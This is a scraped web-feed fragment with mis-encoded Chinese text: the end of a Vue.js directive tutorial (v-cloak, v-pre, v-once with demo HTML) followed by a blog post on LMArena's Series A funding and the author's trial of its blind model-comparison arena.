&lt;<span class="hljs-title">div</span> :<span class="hljs-title">style</span>="{<span class="hljs-title">color</span>: <span class="hljs-title">blue</span>, <span class="hljs-title">fontSize</span>: <span class="hljs-title">font</span>}"&gt;ç»‘å®š<span class="hljs-title">style</span>&lt;/<span class="hljs-title">div</span>&gt;
</code></pre>
<h4 data-id="heading-10">v-cloak</h4>
<p>ä½œç”¨ï¼šè¿™ä¸ªæŒ‡ä»¤ä¿æŒåœ¨å…ƒç´ ä¸Šç›´åˆ°å…³è”å®ä¾‹ç»“æŸç¼–è¯‘ã€‚å’Œ CSS è§„åˆ™å¦‚Â <code>[v-cloak] { display: none }</code>Â ä¸€èµ·ç”¨æ—¶ï¼Œè¿™ä¸ªæŒ‡ä»¤å¯ä»¥éšè—æœªç¼–è¯‘çš„ Mustache æ ‡ç­¾ç›´åˆ°å®ä¾‹å‡†å¤‡å®Œæ¯•ã€‚<a href="https://link.juejin.cn/?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fapi%2F%23v-cloak" title="https://link.juejin.cn/?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fapi%2F%23v-cloak" target="_blank">å®˜æ–¹API</a>Â ã€‚</p>
<p>ä½¿ç”¨åœºæ™¯ï¼šç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°ï¼Œåœ¨ä»‹ç»Â <code>v-model</code>Â çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ª demo å‡ºç°äº†åŒå¤§æ‹¬å·é—ªçƒçš„é—®é¢˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65542e9af1d14dd881350f3612b12e7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=4VZyi7R%2ByVsSkUDmF0ZiIwHWqeI%3D" alt="" loading="lazy"/></p>
<p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p>
<p>åœ¨ CSS ä¸­åŠ ä¸Šå¦‚ä¸‹å±æ€§ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[v-cloak]</span> {
  <span class="hljs-attribute">display</span>: none;
}
</code></pre>
<p>åœ¨ç»‘å®šçš„å˜é‡çš„èŠ‚ç‚¹ä¸ŠåŠ ä¸Š v-cloak</p>
<pre><code class="hljs language-bash" lang="bash">&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">"app"</span> v-cloak&gt;
  {{msg}}
&lt;/div&gt;
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šVue 1.x å’Œ Vue 2.x ä¸­ v-cloak çš„ç”¨æ³•æ˜¯ä¸åŒçš„ã€‚Vue1.x ä¸­ï¼Œå…è®¸å°† Vue å®ä¾‹æŒ‚è½½åœ¨ body ä¸Šï¼Œè€Œ Vue2.x æ˜¯ä¸å…è®¸çš„ï¼Œæƒ³å¯¹æ•´ä¸ªé¡µé¢å®ä¾‹åŒ–ï¼Œéœ€è¦å¦å¤–ç”¨ä¸€ä¸ª div æ¥å®¹çº³æ•´ä¸ªé¡µé¢å†…å®¹ï¼Œå¯¹å…¶è¿›è¡Œå®ä¾‹åŒ–ã€‚</p>
</blockquote>
<p>è¯•æƒ³ç”¨æˆ·æ‰“å¼€ç½‘é¡µï¼Œé—ªè¿‡ä¸€ç‰‡Â <code>{{parmas}}</code>Â ï¼Œä¸èµ·çœ¼çš„å°æŒ‡ä»¤ï¼Œå´æå¤§çš„ä¼˜åŒ–äº†ç½‘é¡µçš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h4 data-id="heading-11">v-pre</h4>
<p>ç›´æ¥è·³è¿‡ Vue çš„ç¼–è¯‘ï¼Œè¾“å‡ºåŸå§‹å€¼ã€‚åœ¨æ ‡ç­¾ä¸­å¦‚ä¸‹ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span> v-pre&gt;{{message}}&lt;/<span class="hljs-selector-tag">div</span>&gt;
</code></pre>
<p>æœ€ç»ˆåœ¨ç½‘é¡µä¸Šè¾“å‡ºçš„ç»“æœæ˜¯Â <code>{{message}}</code>ã€‚</p>
<h4 data-id="heading-12">v-once</h4>
<p>åªåœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“æ—¶æ‰§è¡Œï¼Œä¹‹åçš„æ“ä½œéƒ½è¢«è§†ä¸ºé™æ€å†…å®¹ï¼Œè·³å‡ºä¹‹åçš„æ‰€æœ‰æ¸²æŸ“è¿‡ç¨‹ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-once</span>&gt;</span>ç”¨æˆ·åï¼š{{ username }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">username</span>: <span class="hljs-string">'åä¸‰'</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aca6daf0ddf41faa07f4879e6e69a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=%2BURDIOA774rTCXtbSVbCRsYN9rA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç»™ AI æ‰“ä¸ªåˆ†ï¼Œå°±èƒ½æå‡ºä¼°å€¼17äº¿ç‹¬è§’å…½ï¼Ÿï¼Ÿåˆšåˆšå®Œæˆ1.5äº¿ç¾å…ƒAè½®èèµ„ï¼Œè¿™ä¸ªAI è¯„æµ‹å¹³å°å½»åº•ç«äº†ï¼LMArena]]></title>    <link>https://juejin.cn/post/7592531796043923471</link>    <guid>https://juejin.cn/post/7592531796043923471</guid>    <pubDate>2026-01-08T02:38:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796043923471" data-draft-id="7592524811860688930" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç»™ AI æ‰“ä¸ªåˆ†ï¼Œå°±èƒ½æå‡ºä¼°å€¼17äº¿ç‹¬è§’å…½ï¼Ÿï¼Ÿåˆšåˆšå®Œæˆ1.5äº¿ç¾å…ƒAè½®èèµ„ï¼Œè¿™ä¸ªAI è¯„æµ‹å¹³å°å½»åº•ç«äº†ï¼LMArena"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:38:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’æ¢…ä¸»ç "/> <meta itemprop="url" content="https://juejin.cn/user/2277843825604222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç»™ AI æ‰“ä¸ªåˆ†ï¼Œå°±èƒ½æå‡ºä¼°å€¼17äº¿ç‹¬è§’å…½ï¼Ÿï¼Ÿåˆšåˆšå®Œæˆ1.5äº¿ç¾å…ƒAè½®èèµ„ï¼Œè¿™ä¸ªAI è¯„æµ‹å¹³å°å½»åº•ç«äº†ï¼LMArena
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843825604222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’æ¢…ä¸»ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:38:27.000Z" title="Thu Jan 08 2026 02:38:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ å¥½ï¼Œæˆ‘æ˜¯<strong>æ°å“¥</strong>ã€‚</p>
<p>2026å¹´å¼€å¹´æ²¡å‡ å¤©ï¼ŒAI åœˆåˆçˆ†å‡ºä¸€ä¸ªå¤§æ–°é—»ï¼šé‚£ä¸ªè®©æˆ‘ä»¬å¤©å¤©åˆ·å¤§æ¨¡å‹æ’åçš„ <strong>LMArena</strong>ï¼ˆå‰èº« <strong>Chatbot Arena</strong>ï¼‰ï¼Œæ­£å¼å®£å¸ƒå®Œæˆ <strong>1.5 äº¿ç¾å…ƒAè½®èèµ„</strong>ï¼Œèèµ„åä¼°å€¼ç›´æ¥é£™åˆ°<strong>17 äº¿ç¾å…ƒ</strong>ï¼Œå¦¥å¦¥æˆä¸ºAIç‹¬è§’å…½ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f5c60ec1c50401282b7c091f3a242d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=PSdmk%2FJsHHHakpoBCi%2FRlNnlZOg%3D" alt="image.png" loading="lazy"/></p>
<p>ä»ä¸€ä¸ªå¤§å­¦å®éªŒå®¤çš„å¼€æºé¡¹ç›®ï¼Œåˆ°å¦‚ä»Šä¼°å€¼ 17äº¿çš„å•†ä¸šå…¬å¸ï¼Œ<strong>LMArena</strong> åªç”¨äº†ä¸åˆ°ä¸‰å¹´æ—¶é—´ã€‚</p>
<p>è¿™æ³¢æ“ä½œï¼ŒçœŸçš„è®©äººæ„Ÿå¹ï¼šåŸæ¥ç»™ AI æ¨¡å‹â€œæ‰“åˆ†â€ï¼Œä¹Ÿèƒ½æ‰“å‡ºä¸Šäº¿èº«å®¶ï¼</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠèŠè¿™ä¸ªç°è±¡çº§ AI è¯„æµ‹å¹³å°ï¼Œçœ‹çœ‹å®ƒåˆ°åº•å‡­ä»€ä¹ˆè¿™ä¹ˆç‰›ã€‚</p>
<h2 data-id="heading-0">ä»å­¦æœ¯ç©å…·åˆ°è¡Œä¸šæ ‡æ†ï¼šLMArenaçš„é€†è¢­ä¹‹è·¯</h2>
<p><strong>LMArena</strong> çš„å‰èº«æ˜¯ <strong>LMSYS Org</strong> æ¨å‡ºçš„ <strong>Chatbot Arena</strong>ï¼Œæœ€æ—©åªæ˜¯ UC ä¼¯å…‹åˆ©ç­‰é«˜æ ¡ç ”ç©¶è€…æçš„ä¸€ä¸ªå°å®éªŒã€‚</p>
<p>2023 å¹´ ChatGPT ç«äº†ä¹‹åï¼Œå¤§å®¶å‘ç°ä¼ ç»ŸåŸºå‡†æµ‹è¯•ï¼ˆåƒ <strong>MMLUã€HumanEval</strong>ï¼‰æ ¹æœ¬æµ‹ä¸å‡ºæ¨¡å‹çœŸå®æ°´å¹³â€”â€”åšé¢˜å¼ºï¼Œä¸ä»£è¡¨èŠå¤©å¥½ç”¨ã€‚</p>
<p>äºæ˜¯ <strong>LMSYS</strong> å›¢é˜Ÿçµæœºä¸€åŠ¨ï¼šå¹²è„†è®©ç”¨æˆ·ç›´æ¥ç›²æµ‹æŠ•ç¥¨å§ï¼</p>
<p>ç”¨æˆ·è¾“å…¥åŒä¸€ä¸ªé—®é¢˜ï¼Œä¸¤ä¸ªåŒ¿åæ¨¡å‹åŒæ—¶å›ç­”ï¼Œä½ æŠ•ç¥¨é€‰å“ªä¸ªæ›´å¥½ï¼ŒæŠ•ç¥¨å®Œå†æ­æ™“æ˜¯è°å¯¹è°ã€‚</p>
<p>è¿™ç§â€œ<strong>ä¼—åŒ…+åŒç›²+Eloè¯„åˆ†</strong>â€çš„æ¨¡å¼ï¼Œä¸€ä¸‹å­å°±ç«äº†ã€‚</p>
<p>çŸ­çŸ­å‡ å¹´ï¼š</p>
<ul>
<li>ç´¯è®¡è¶…è¿‡<strong>5000ä¸‡å¼ ç”¨æˆ·æŠ•ç¥¨</strong></li>
<li>è¯„ä¼°äº†<strong>400å¤šä¸ª</strong>å¼€æºå’Œé—­æºæ¨¡å‹</li>
<li>å¼€æºäº†<strong>14.5ä¸‡ä¸ª</strong>é«˜è´¨é‡å¯¹æˆ˜æ•°æ®</li>
<li>æ”¯æŒæ–‡æœ¬ã€è§†è§‰ã€å›¾åƒç”Ÿæˆã€è§†é¢‘ç­‰å¤šæ¨¡æ€è¯„æµ‹</li>
</ul>
<p>ç°åœ¨ï¼Œæ–°æ¨¡å‹ä¸€å‘å¸ƒï¼Œç¬¬ä¸€ä»¶äº‹å°±æ˜¯å†²åˆ° <strong>LMArena</strong> çœ‹æ’åã€‚**Geminiã€Claudeã€Grokã€DeepSeekâ€¦â€¦**å“ªä¸ªæ²¡åœ¨è¿™é‡Œè¢«ç”¨æˆ·â€œæ‹·æ‰“â€è¿‡ï¼Ÿ</p>
<p>å®ƒå·²ç»æˆäº†AIè¡Œä¸šçš„â€œé»„é‡‘æ ‡å‡†â€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31bb7463e7ec490bba241a7f93e6b883~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=ixB8uCIX%2BQq48jgg%2FuL2OWVkFEs%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">é‡ç£…èèµ„ç»†èŠ‚ï¼šå¤§ä½¬ä»¬é›†ä½“All in</h2>
<p>è¿™æ¬¡Aè½®èèµ„è§„æ¨¡<strong>1.5äº¿ç¾å…ƒ</strong>ï¼Œç”±<strong>Felicis</strong>å’Œ<strong>åŠ å·å¤§å­¦æŠ•èµ„å…¬å¸UC Investments</strong>é¢†æŠ•ï¼Œ<strong>a16zï¼ˆAndreessen Horowitzï¼‰ã€Kleiner Perkinsã€Lightspeed Venture Partners</strong>ç­‰ä¸€ä¼—é¡¶çº§VCè·ŸæŠ•ã€‚</p>
<p>è¦çŸ¥é“ï¼Œ2025 å¹´ 5 æœˆå®ƒæ‰åˆšæ‹¿äº† 1 äº¿ç¾å…ƒç§å­è½®ï¼Œå½“æ—¶ä¼°å€¼ 6 äº¿ã€‚</p>
<p>çŸ­çŸ­ 8ä¸ªæœˆï¼Œä¼°å€¼ç›´æ¥ç¿»äº†è¿‘ 3å€ï¼</p>
<p>å›¢é˜Ÿè¡¨ç¤ºï¼Œè¿™ç¬”é’±å°†ç”¨æ¥ï¼š</p>
<ul>
<li>åŠ é€Ÿå¼€å‘æ–°åŠŸèƒ½</li>
<li>æå‡ç”¨æˆ·ä½“éªŒ</li>
<li>æ‰©å¤§å›¢é˜Ÿè§„æ¨¡</li>
<li>ç»§ç»­ä¿æŒç¤¾åŒºé©±åŠ¨çš„å¼€æ”¾ç²¾ç¥</li>
</ul>
<p>åˆ›å§‹äººå›¢é˜ŸåŸºæœ¬éƒ½æ˜¯ä¼¯å…‹åˆ©ã€æ–¯å¦ç¦ã€CMUç­‰é¡¶æ ¡çš„90ååäººç ”ç©¶å‘˜ï¼ŒæŠ€æœ¯ç¡¬æ ¸ï¼Œä½è°ƒåŠ¡å®ã€‚</p>
<p>å®˜æ–¹å…¬å‘Šé‡Œè¿˜ç‰¹åˆ«æ„Ÿè°¢ç¤¾åŒºï¼šæ²¡æœ‰å¤§å®¶çš„ <strong>5000ä¸‡</strong>å¼ æŠ•ç¥¨ï¼Œå°±æ²¡æœ‰ä»Šå¤©çš„ <strong>LMArena</strong>ã€‚</p>
<h2 data-id="heading-2">ä¸ºä»€ä¹ˆLMArenaè¿™ä¹ˆé‡è¦ï¼Ÿ</h2>
<p>ä¼ ç»ŸåŸºå‡†æ˜¯â€œè€ƒè¯•å¼â€æµ‹åˆ†ï¼ŒLMArenaæ˜¯â€œæ“‚å°å¼â€çœŸäººPKã€‚</p>
<p>ä¼˜åŠ¿æ˜¾è€Œæ˜“è§ï¼š</p>
<ol>
<li><strong>çœŸå®ç”¨æˆ·åå¥½</strong>ï¼šåæ˜ çœŸå®ä½¿ç”¨åœºæ™¯ï¼Œè€Œä¸æ˜¯å®éªŒå®¤æ•°æ®</li>
<li><strong>å…¬å¹³åŒç›²</strong>ï¼šé¿å…å“ç‰Œå…‰ç¯å½±å“ï¼ˆå¾ˆå¤šäººä¸€çœ‹åˆ°GPTå°±æŠ•å®ƒï¼‰</li>
<li><strong>åŠ¨æ€æ’è¡Œ</strong>ï¼šEloè¯„åˆ†å®æ—¶æ›´æ–°ï¼Œæ–°æ¨¡å‹éšæ—¶èƒ½å†²æ¦œ</li>
<li><strong>å¤šæ¨¡æ€æ”¯æŒ</strong>ï¼šä¸æ­¢èŠå¤©ï¼Œè¿˜èƒ½æ¯”ç”»å›¾ã€çœ‹å›¾ã€å†™ä»£ç </li>
</ol>
<p>å®ƒä¸ä»…å¸®ç”¨æˆ·é€‰æ¨¡å‹ï¼Œè¿˜ç»™å¼€å‘è€…æä¾›äº†æœ€å®è´µçš„åé¦ˆæ•°æ®ï¼Œæ¨åŠ¨æ•´ä¸ªè¡Œä¸šè¿›æ­¥ã€‚</p>
<h4 data-id="heading-3">äº²æµ‹ä½“éªŒï¼šä¸¤åˆ†é’Ÿä¸Šç˜¾ï¼Œæ ¹æœ¬åœä¸ä¸‹æ¥</h4>
<p>æˆ‘ç¬¬ä¸€æ—¶é—´å»å®˜ç½‘ <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Flmarena.ai%2F" target="_blank" title="https://lmarena.ai/" ref="nofollow noopener noreferrer">lmarena.ai/</a></strong> è¯•ç©äº†<strong>Battleæ¨¡å¼</strong>ï¼ŒçœŸçš„å¤ªçˆ½äº†ï¼</p>
<p><strong>ä½“éªŒ1ï¼šç»å…¸ç›²æµ‹å¯¹æˆ˜</strong></p>
<p>ç‚¹å¼€â€œNew Chatâ€ â†’ é€‰æ‹©â€œBattleâ€æ¨¡å¼ï¼Œè¾“å…¥é—®é¢˜ï¼šâ€œå¸®æˆ‘å†™ä¸€é¦–å…³äº2026å¹´AIç‹¬è§’å…½çš„æ‰“æ²¹è¯—ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c38e01d607d47fca2fe67ffa72132cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=VdnwcMbzwkYNXIZPTRXBzT%2FTrJ8%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸¤ä¸ªåŒ¿åæ¨¡å‹ï¼ˆå·¦Model Aï¼Œå³Model Bï¼‰åŒæ—¶ç»™å‡ºç­”æ¡ˆã€‚</p>
<p>ä¸€ä¸ªè¯—å†™å¾—æŠ¼éŸµå¹½é»˜ï¼Œä¸€ä¸ªæ›´ç»“æ„åŒ–ä½†å¹³æ·¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afcd8f6e054a4e41a79b798867da7a47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S5qKF5Li756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444706&amp;x-signature=5lcrlNuSmElSgjcNsfAT1nGg0sE%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘æœæ–­æŠ•äº†å·¦è¾¹æ›´å¥½â€”â€”æ­æ™“ï¼å·¦è¾¹å±…ç„¶æ˜¯ <strong>claude-ops-4.1</strong>ï¼Œå³è¾¹æ˜¯ <strong>gpt-5.1</strong>ã€‚</p>
<p>ç¬é—´æœ‰ç§â€œäººæ°‘çš„åŠ›é‡â€çš„æˆå°±æ„Ÿï¼</p>
<p><strong>ä½“éªŒ2ï¼šå›¾åƒç”Ÿæˆæ“‚å°</strong></p>
<p>åˆ‡æ¢åˆ° <strong>Text-to-Image Arena</strong>ï¼Œè¾“å…¥æç¤ºè¯ï¼šâ€œä¸€åªå¸¦ç€çœ¼ç›çš„æ³¢æ–¯çŒ«åœ¨éœ“è™¹éƒ½å¸‚é£é©°â€ã€‚</p>
<p>ä¸¤ä¸ªæ¨¡å‹ç”Ÿæˆçš„å›¾åŒæ—¶å±•ç¤ºï¼Œæˆ‘æŠ•äº†æ›´é…·çš„é‚£å¼ ã€‚</p>
<p>æŠ•ç¥¨å®Œè¿˜èƒ½çœ‹åˆ°è¯¦ç»†æ’åå’Œå†å²å¯¹æˆ˜è®°å½•ã€‚</p>
<p><strong>ä½“éªŒ3ï¼šæŸ¥çœ‹æ’è¡Œæ¦œ</strong></p>
